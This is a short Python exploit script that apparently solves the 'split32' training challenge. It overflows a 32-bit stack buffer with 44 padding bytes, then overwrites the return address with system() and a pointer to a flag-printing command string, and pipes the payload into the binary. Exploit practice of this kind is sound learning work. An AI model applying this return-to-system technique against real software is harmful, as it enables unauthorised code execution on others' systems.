#!/usr/bin/python
import struct
import os

system_addr = struct.pack("<I",0x8048430)
#rabin2 -z split32
cat_flag = struct.pack("<I",0x0804a030)
garb = struct.pack("<I",0xdeadbeef)

garbage = "A"*44

exploit = garbage+system_addr+garb+cat_flag

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()
os.system("cat simple_exploit.txt|./split32")
